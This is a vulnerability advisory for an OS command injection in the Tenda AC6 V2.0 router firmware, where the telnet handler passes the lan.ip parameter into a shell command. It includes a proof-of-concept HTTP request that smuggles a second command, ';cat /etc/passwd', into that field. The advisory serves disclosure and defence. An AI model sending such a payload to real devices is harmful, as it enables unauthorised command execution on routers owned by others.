## Tenda AC6V2 TendaTelnet Command Injection

### Title

```
Tenda AC6 V2.0 TendaTelnet Command Injection via lan.ip
```

### Vendor / Product / Version

```
Tenda / AC6 V2.0 (AC1206) / Firmware V15.03.06.23
```

### Component

```
/bin/httpd — TendaTelnet handler (0x45b860)
```

### CVSS 3.1

```
8.8 (High) CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

### Description

```
An OS command injection vulnerability exists in the TendaTelnet function
(0x45b860) of /bin/httpd in Tenda AC6 V2.0 firmware V15.03.06.23.

The function reads the "lan.ip" parameter via websGetVar() and formats
it into "telnetd -b %s &" via doSystemCmd(), which calls system().
No input sanitization is performed.

No formal CVE number exists for this vulnerability. Only an informal
GitHub PoC (cecada/Tenda-AC6-Root-Access) references this issue.
```

### Proof of Concept

```http
POST /goform/telnet HTTP/1.1
Host: 192.168.0.1
Content-Type: application/x-www-form-urlencoded
Cookie: <valid_session>

lan.ip=;cat /etc/passwd
```

### Credit

```
Discovered by ST4R using FirmRec automated symbolic execution engine.
```

